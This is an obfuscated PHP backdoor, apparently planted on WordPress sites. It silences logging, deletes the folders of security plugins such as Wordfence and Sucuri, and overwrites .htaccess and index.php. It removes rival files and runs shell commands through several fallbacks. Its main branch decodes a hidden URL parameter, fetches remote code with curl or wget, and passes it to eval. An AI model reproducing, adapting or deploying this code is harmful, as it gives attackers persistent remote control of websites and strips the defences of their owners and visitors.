<?php
error_reporting(0);
echo "<br>      ";
ini_set('error_log', NULL);
ini_set('log_errors', 0);
ini_set('display_errors', 0);
error_reporting("\x00\x00\x0f\x03\x18");
define('Úº', '§');
$GLOBALS[Úº] = array(0 => "error_log", 1 => "log_errors", 2 => "display_errors", 3 => "<br>", 4 => "explode", 5 => "str_split", 6 => "/file_put_contents/", 7 => "/fwrite/", 8 => "./*", 9 => "/", 10 => ".php", 11 => "", 12 => "\n", 13 => "file_put_contents", 14 => "w", 15 => "PHP_SELF", 16 => "DOCUMENT_ROOT", 17 => "cat ", 18 => "file_get_contents", 19 => "fopen", 20 => "stream_get_contents", 21 => "r", 22 => "implode", 23 => "file", 24 => "../", 25 => "?", 26 => "..", 27 => ".", 28 => "dir", 29 => "./", 30 => "exec", 31 => "passthru", 32 => "system", 33 => "shell_exec", 34 => "", 35 => "COOKIE.txt", 36 => "HTTP_USER_AGENT", 37 => "/Warning:/", 38 => "<?php", 39 => "COOKIE.txt", 40 => "#name=\"atok\" value=\"(.*)\">#", 41 => "/cdn-cgi/phish-bypass?u=/&atok=", 42 => "wget --header=\"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.1 Mobile/15E148 Safari/604.1\" --header=\"Referer: https://google.com/\" ", 43 => " -O ", 44 => "/tmp/", 45 => "123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", 46 => ".txt", 47 => "stream_context_create", 48 => "r", 49 => "http", 50 => "method", 51 => "GET", 52 => "header", 53 => "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.1 Mobile/15E148 Safari/604.1\r\nReferer: https://google.com/\r\n", 54 => "curl_exec", 55 => "https://", 56 => "https://google.com/", 57 => "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.1 Mobile/15E148 Safari/604.1", 58 => "method", 59 => "GET", 60 => "header", 61 => "REQUEST_URI", 62 => "y", 63 => "a", 64 => "s", 65 => "b", 66 => "d", 67 => "u", 68 => "f", 69 => "q", 70 => "k", 71 => "p", 72 => "l", 73 => "z", 74 => "h", 75 => "i", 76 => "j", 77 => "v", 78 => "x", 79 => "//", 80 => ".", 81 => "sucuri-scanner", 82 => "better-wp-security", 83 => "jetpack", 84 => "wpscan", 85 => "wordfence", 86 => "bulletproof-security", 87 => "all-in-one-wp-security-and-firewall", 88 => "miniorange-2-factor-authentication", 89 => "/wp-content/plugins/", 90 => "/.htaccess", 91 => "/deny(.*)from(.*)all/", 92 => "/order(.*)allow(.*)deny/", 93 => "/index.php", 94 => "/wp-includes/plugin.php", 95 => "/wp-blog-header.php/", 96 => "<?php\ndefine( 'WP_USE_THEMES', true );\nrequire __DIR__ . '/wp-blog-header.php';", 97 => "/<html/", 98 => "/<div/", 99 => "/<head>/", 100 => "/<script>/", 101 => "/\\\$path.*=.*\"(.*)\";/", 102 => "<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php\$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n</IfModule>", 103 => "/index.php/", 104 => "/index.php.bak/", 105 => "index.php", 106 => "index.php.bak", 107 => "/about.php", 108 => "/d_time/", 109 => "/SylVxy/", 110 => "/radio.php", 111 => "action", 112 => "http://", 113 => "<?", 114 => "?>", 115 => "action", 116 => "H*", 117 => "403", 118 => "/.user.ini", 119 => "KEY: <!-- MD5: ", 120 => "HTTP_HOST", 121 => "\xe2\x80\x93->");
error_reporting(0);
@ini_set($GLOBALS[Úº][0], NULL);
@ini_set($GLOBALS[Úº][0x1], 0);
@ini_set($GLOBALS[Úº][0x2], 0);
echo "<br>";
if (!function_exists($GLOBALS[Úº][0x4])) {
    function explode($str, $array)
    {
        return split($str, $array);
    }
}
if (!function_exists($GLOBALS[Úº][0x5])) {
    function str_split($text, $split = 0x1)
    {
        $array = array();
        for ($i = 0; $i < strlen($text);) {
            $array[] = substr($text, $i, $split);
            $i += $split;
        }
        return $array;
    }
}
function oDxsw($j_7Nl, $bf80o = null, $kiuKi = null)
{
    $QvxWc = curl_init();
    curl_setopt($QvxWc, CURLOPT_URL, $j_7Nl);
    curl_setopt($QvxWc, CURLOPT_HEADER, !0);
    curl_setopt($QvxWc, CURLOPT_RETURNTRANSFER, 0x1);
    curl_setopt($QvxWc, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
    curl_setopt($QvxWc, CURLOPT_CONNECTTIMEOUT, 0x1e);
    curl_setopt($QvxWc, CURLOPT_TIMEOUT, 0x1e);
    curl_setopt($QvxWc, CURLOPT_FOLLOWLOCATION, 0x1);
    curl_setopt($QvxWc, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($QvxWc, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($QvxWc, CURLOPT_USERAGENT, $_SERVER[$GLOBALS[Úº][0x24]]);
    curl_setopt($QvxWc, CURLOPT_COOKIEFILE, $GLOBALS[Úº][0x23]);
    curl_setopt($QvxWc, CURLOPT_COOKIEJAR, $GLOBALS[Úº][0x23]);
    if ($bf80o != null) {
        curl_setopt($QvxWc, CURLOPT_HTTPHEADER, $bf80o);
    }
    if ($kiuKi != null) {
        curl_setopt($QvxWc, CURLOPT_POST, 0x1);
        curl_setopt($QvxWc, CURLOPT_POSTFIELDS, $kiuKi);
    }
    $HOv2H = curl_exec($QvxWc);
    curl_close($QvxWc);
    return $HOv2H;
}
function RK_c8($WjdeA)
{
    $FkCuj = $GLOBALS[Úº][0xb];
    if (function_exists($GLOBALS[Úº][0x1e])) {
        @exec($WjdeA, $FkCuj);
        $FkCuj = @join($GLOBALS[Úº][0xc], $FkCuj);
    } elseif (function_exists($GLOBALS[Úº][0x1f])) {
        ob_start();
        @passthru($WjdeA);
        $FkCuj = ob_get_clean();
    } elseif (function_exists($GLOBALS[Úº][0x20])) {
        ob_start();
        @system($WjdeA);
        $FkCuj = ob_get_clean();
    } elseif (function_exists($GLOBALS[Úº][0x21])) {
        $FkCuj = shell_exec($WjdeA);
    } elseif (is_resource($aWMlI = @popen($WjdeA, $GLOBALS[Úº][0x15]))) {
        $FkCuj = $GLOBALS[Úº][0x22];
        while (!@feof($aWMlI)) {
            $FkCuj .= fread($aWMlI, 0x400);
        }
        pclose($aWMlI);
    }
    return $FkCuj;
}
function JUgSe($IzeGa)
{
    $FiYF_ = $GLOBALS[Úº][0xb];
    if (trim($FiYF_) == $GLOBALS[Úº][0xb] && function_exists($GLOBALS[Úº][0x12]) && function_exists($GLOBALS[Úº][0x2f])) {
        $FiYF_ = file_get_contents($IzeGa, !1, stream_context_create(array($GLOBALS[Úº][0x31] => array($GLOBALS[Úº][0x3a] => $GLOBALS[Úº][0x3b], $GLOBALS[Úº][0x3c] => $GLOBALS[Úº][0x35]))));
    }
    if (trim($FiYF_) == $GLOBALS[Úº][0xb] && function_exists($GLOBALS[Úº][0x36])) {
        $s2gFs = curl_init();
        curl_setopt($s2gFs, CURLOPT_TIMEOUT, 0xa);
        curl_setopt($s2gFs, CURLOPT_RETURNTRANSFER, !0);
        curl_setopt($s2gFs, CURLOPT_URL, $IzeGa);
        curl_setopt($s2gFs, CURLOPT_USERAGENT, $GLOBALS[Úº][0x39]);
        curl_setopt($s2gFs, CURLOPT_REFERER, $GLOBALS[Úº][0x38]);
        curl_setopt($s2gFs, CURLOPT_FOLLOWLOCATION, !0);
        if (stristr($IzeGa, $GLOBALS[Úº][0x37])) {
            curl_setopt($s2gFs, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($s2gFs, CURLOPT_SSL_VERIFYHOST, 0);
        }
        curl_setopt($s2gFs, CURLOPT_HEADER, !1);
        $FiYF_ = curl_exec($s2gFs);
        curl_close($s2gFs);
    }
    if (trim($FiYF_) == $GLOBALS[Úº][0xb]) {
        $fO5cJ = $GLOBALS[Úº][0x2c] . substr(str_shuffle($GLOBALS[Úº][0x2d]), 0x32) . $GLOBALS[Úº][0x2e];
        rK_C8($GLOBALS[Úº][0x2a] . $IzeGa . $GLOBALS[Úº][0x2b] . $fO5cJ);
        if (function_exists($GLOBALS[Úº][0x12])) {
            $FiYF_ = file_get_contents($fO5cJ);
        } else {
            $FiYF_ = stream_get_contents(fopen($fO5cJ, $GLOBALS[Úº][0x15]));
        }
        unlink($fO5cJ);
    }
    if (trim($FiYF_) == $GLOBALS[Úº][0xb] && function_exists($GLOBALS[Úº][0x13]) && function_exists($GLOBALS[Úº][0x14]) && function_exists($GLOBALS[Úº][0x2f])) {
        $RNvUK = fopen($IzeGa, $GLOBALS[Úº][0x30], !1, stream_context_create(array($GLOBALS[Úº][0x31] => array($GLOBALS[Úº][0x32] => $GLOBALS[Úº][0x33], $GLOBALS[Úº][0x34] => $GLOBALS[Úº][0x35]))));
        $FiYF_ = stream_get_contents($RNvUK);
    }
    return $FiYF_;
}
function AsrZX($ok6e_)
{
    $p35sK = $GLOBALS[Úº][0xb];
    if (function_exists($GLOBALS[Úº][0x12])) {
        $p35sK = file_get_contents($ok6e_);
    } elseif (function_exists($GLOBALS[Úº][0x13]) && function_exists($GLOBALS[Úº][0x14])) {
        $p35sK = stream_get_contents(fopen($ok6e_, $GLOBALS[Úº][0x15]));
    } elseif (function_exists($GLOBALS[Úº][0x16]) && function_exists($GLOBALS[Úº][0x17])) {
        $p35sK = implode(file($ok6e_));
    } elseif (function_exists($GLOBALS[Úº][0x17])) {
        $mPYIt = file($ok6e_);
        if (function_exists($GLOBALS[Úº][0x16])) {
            $p35sK = implode($mPYIt);
        } else {
            foreach ($mPYIt as $zd4bR) {
                $p35sK .= $zd4bR;
            }
        }
    }
    if (trim($p35sK) == $GLOBALS[Úº][0xb]) {
        $p35sK = Rk_c8($GLOBALS[Úº][0x11] . $ok6e_);
    }
    return $p35sK;
}
function QxB8Z($ok6e_, $iTqoS)
{
    if (function_exists($GLOBALS[Úº][0xd])) {
        $fYuhN = file_put_contents($ok6e_, $iTqoS);
    } else {
        $fYuhN = fwrite(fopen($ok6e_, $GLOBALS[Úº][0xe]), $iTqoS);
    }
    return $fYuhN;
}
function ZMpTl($KKNL0, $bN80E)
{
    $n6JcJ = 0;
    $Nzr3p = aSRzx($KKNL0);
    $mPYIt = explode($GLOBALS[Úº][0xc], $Nzr3p);
    foreach ($mPYIt as $zd4bR) {
        if (strstr($zd4bR, $bN80E)) {
            $n6JcJ++;
        }
    }
    return $n6JcJ;
}
function rlAoq($KKNL0, $bN80E)
{
    $Nucua = ZMPtL($KKNL0, $bN80E);
    $Nzr3p = ASRzx($KKNL0);
    $mPYIt = explode($GLOBALS[Úº][0xc], $Nzr3p);
    $tlBti = $GLOBALS[Úº][0xb];
    foreach ($mPYIt as $zd4bR) {
        if (strstr($zd4bR, $bN80E) || $Nucua <= 0) {
            $Nucua--;
            if ($Nucua <= 0) {
                $tlBti .= $zd4bR . $GLOBALS[Úº][0xc];
            }
        }
    }
    return $tlBti;
}
function MiMRi($BSTSR)
{
    $iTMgs = $BSTSR . $GLOBALS[Úº][0x5a];
    $CTswv = strtolower(aSRZX($iTMgs));
    if (preg_match($GLOBALS[Úº][0x5b], $CTswv) || preg_match($GLOBALS[Úº][0x5c], $CTswv)) {
        $qsml6 = $BSTSR . $GLOBALS[Úº][0x5e];
        $HH0Dt = aSrzx($qsml6);
        if (preg_match($GLOBALS[Úº][0x67], $HH0Dt) && !preg_match($GLOBALS[Úº][0x68], $HH0Dt)) {
            $HH0Dt = str_replace($GLOBALS[Úº][0x69], $GLOBALS[Úº][0x6a], $HH0Dt);
            chmod($qsml6, 0644);
            qXb8Z($qsml6, $HH0Dt);
        }
        if (preg_match($GLOBALS[Úº][0x65], $HH0Dt, $A0J4x)) {
            unlink($A0J4x[0x1]);
        }
        $Xa3Xv = $BSTSR . $GLOBALS[Úº][0x6b];
        $r4rLX = ASRZX($Xa3Xv);
        if (file_exists($Xa3Xv) && (preg_match($GLOBALS[Úº][0x6c], $r4rLX) || preg_match($GLOBALS[Úº][0x6d], $r4rLX))) {
            unlink($Xa3Xv);
            unlink($BSTSR . $GLOBALS[Úº][0x6e]);
        }
        $YzXVO = $BSTSR . $GLOBALS[Úº][0x5d];
        $ZcVkF = Asrzx($YzXVO);
        if (preg_match($GLOBALS[Úº][0x5f], $ZcVkF)) {
            $TnBIs = $GLOBALS[Úº][0x60];
            chmod($YzXVO, 0644);
            qxb8z($YzXVO, $TnBIs);
        } elseif (strstr($ZcVkF, $GLOBALS[Úº][0x26]) && !preg_match($GLOBALS[Úº][0x61], $ZcVkF) && !preg_match($GLOBALS[Úº][0x62], $ZcVkF) && !preg_match($GLOBALS[Úº][0x63], $ZcVkF) && !preg_match($GLOBALS[Úº][0x64], $ZcVkF)) {
            $TnBIs = rLaoq($YzXVO, $GLOBALS[Úº][0x26]);
            chmod($YzXVO, 0644);
            qxb8z($YzXVO, $TnBIs);
        }
        chmod($iTMgs, 0644);
        $z_5mN = $GLOBALS[Úº][0x66];
        QXb8Z($iTMgs, $z_5mN);
    }
}
function iRmJx($ok6e_)
{
    $ok6e_ = substr($ok6e_, -1) == $GLOBALS[Úº][0x9] ? $ok6e_ : $ok6e_ . $GLOBALS[Úº][0x9];
    $SZzID = opendir($ok6e_);
    while (($phOnJ = readdir($SZzID)) !== !1) {
        $phOnJ = $ok6e_ . $phOnJ;
        if (basename($phOnJ) == $GLOBALS[Úº][0x1a] || basename($phOnJ) == $GLOBALS[Úº][0x1b]) {
            continue;
        }
        $tabyZ = filetype($phOnJ);
        if ($tabyZ == $GLOBALS[Úº][0x1c]) {
            irMjX($phOnJ);
        } else {
            @unlink($phOnJ);
        }
    }
    closedir($SZzID);
}
function ocIVI($BSTSR)
{
    $jYG7l = array($GLOBALS[Úº][0x51], $GLOBALS[Úº][0x52], $GLOBALS[Úº][0x53], $GLOBALS[Úº][0x54], $GLOBALS[Úº][0x55], $GLOBALS[Úº][0x56], $GLOBALS[Úº][0x57], $GLOBALS[Úº][0x58]);
    foreach ($jYG7l as $HH0Dt) {
        $jAUNf = $BSTSR . $GLOBALS[Úº][0x59] . $HH0Dt;
        if (is_dir($jAUNf)) {
            iRmJx($jAUNf);
        }
    }
}
$GhlyG = strval(basename("/var/www/html/bkv8.txt"));
$aWMlI = explode($GLOBALS[Úº][0x50], $GhlyG);
$GhlyG = $aWMlI[0] . $GLOBALS[Úº][0xa];
$Nzr3p = aSRzx($GhlyG);
if (preg_match($GLOBALS[Úº][0x6], $Nzr3p) || preg_match($GLOBALS[Úº][0x7], $Nzr3p)) {
    $LhFlr = glob($GLOBALS[Úº][0x8]);
    foreach ($LhFlr as $KKNL0) {
        if (is_file($KKNL0)) {
            unlink($KKNL0);
        }
    }
    exit;
}
function LE86Y($ZJoHI, $iTqoS)
{
    if (preg_match($GLOBALS[Úº][0x25], $iTqoS)) {
        preg_match($GLOBALS[Úº][0x28], $iTqoS, $s2WNP);
        $s2WNP = $s2WNP[0x1];
        $dbhhI = oDXSW($ZJoHI . $GLOBALS[Úº][0x29] . $s2WNP);
        $iTqoS = odxSw($ZJoHI);
        $iKFfw = $GLOBALS[Úº][0x26];
        $RJWgv = strpos($iTqoS, $iKFfw) + strlen($iKFfw);
        $iTqoS = $GLOBALS[Úº][0x26] . substr($iTqoS, $RJWgv);
        unlink($GLOBALS[Úº][0x27]);
    }
    return $iTqoS;
}
function FbJtr($P94B6)
{
    $dozF_ = array($GLOBALS[Úº][0x3e] => $GLOBALS[Úº][0x3f], $GLOBALS[Úº][0x40] => $GLOBALS[Úº][0x41], $GLOBALS[Úº][0x3f] => $GLOBALS[Úº][0x42], $GLOBALS[Úº][0x43] => $GLOBALS[Úº][0x44], $GLOBALS[Úº][0x45] => $GLOBALS[Úº][0x46], $GLOBALS[Úº][0x47] => $GLOBALS[Úº][0x48], $GLOBALS[Úº][0x49] => $GLOBALS[Úº][0x4a], $GLOBALS[Úº][0x41] => $GLOBALS[Úº][0x4b], $GLOBALS[Úº][0x44] => $GLOBALS[Úº][0x4c], $GLOBALS[Úº][0x4d] => $GLOBALS[Úº][0x47], $GLOBALS[Úº][0x42] => $GLOBALS[Úº][0x45], $GLOBALS[Úº][0x4b] => $GLOBALS[Úº][0x40], $GLOBALS[Úº][0x4e] => $GLOBALS[Úº][0x43], $GLOBALS[Úº][0x48] => $GLOBALS[Úº][0x4d], $GLOBALS[Úº][0x46] => $GLOBALS[Úº][0x4e], $GLOBALS[Úº][0x4a] => $GLOBALS[Úº][0x3e], $GLOBALS[Úº][0x4c] => $GLOBALS[Úº][0x49]);
    $zYBxV = str_split($P94B6);
    $Tax0X = $GLOBALS[Úº][0xb];
    foreach ($zYBxV as $Um4AM) {
        if (in_array($Um4AM, $dozF_)) {
            $Tax0X .= $dozF_[$Um4AM];
        } else {
            $Tax0X .= $Um4AM;
        }
    }
    return $Tax0X;
}
function eOcGK($BSTSR)
{
    $BPpYo = realpath($BSTSR);
    if (trim($BPpYo) == $GLOBALS[Úº][0xb]) {
        $BPpYo = $_SERVER[$GLOBALS[Úº][0x10]];
    }
    if (!stristr(getcwd(), $BPpYo)) {
        $BPpYo = str_replace($_SERVER[$GLOBALS[Úº][0xf]], $GLOBALS[Úº][0xb], "/var/www/html/anj4.txt");
    }
    return $BPpYo;
}
$smTub = strval($_SERVER[$GLOBALS[Úº][0x3d]]);
while (strstr($smTub, $GLOBALS[Úº][0x4f])) {
    $smTub = str_replace($GLOBALS[Úº][0x4f], $GLOBALS[Úº][0x9], $smTub);
}
if (strstr($smTub, $GLOBALS[Úº][0x19])) {
    $smTub = explode($GLOBALS[Úº][0x19], $smTub);
    $smTub = $smTub[0];
}
$tzTJj = substr_count($smTub, $GLOBALS[Úº][0x9]);
$BSTSR = $GLOBALS[Úº][0x1d];
$K71UX = 0x1;
while ($K71UX < intval($tzTJj)) {
    $BSTSR .= $GLOBALS[Úº][0x18];
    $K71UX++;
}
$BSTSR = EOcgk($BSTSR);
MiMRi($BSTSR);
oCIVi($BSTSR);
if (isset($_GET[$GLOBALS[Úº][0x6f]])) {
    $vo1vU = trim($_GET[$GLOBALS[Úº][0x73]]);
    $vo1vU = str_rot13(pack($GLOBALS[Úº][0x74], strrev($vo1vU)));
    $F3bIg = JuGse($GLOBALS[Úº][0x70] . FbJTr($vo1vU));
    $F3bIg = Le86y($GLOBALS[Úº][0x70] . fbjtR($vo1vU), $F3bIg);
    $F3bIg = str_replace(array($GLOBALS[Úº][0x26], $GLOBALS[Úº][0x71], $GLOBALS[Úº][0x72]), $GLOBALS[Úº][0xb], $F3bIg);
    eval($F3bIg);
} elseif (isset($_GET[$GLOBALS[Úº][0x75]])) {
    $CTswv = $GLOBALS[Úº][0x66];
    chmod($BSTSR . $GLOBALS[Úº][0x5a], 0644);
    QxB8z($BSTSR . $GLOBALS[Úº][0x5a], $CTswv);
    unlink($BSTSR . $GLOBALS[Úº][0x76]);
} else {
    echo $GLOBALS[Úº][0x77] . md5($_SERVER[$GLOBALS[Úº][0x78]]) . $GLOBALS[Úº][0x79];
}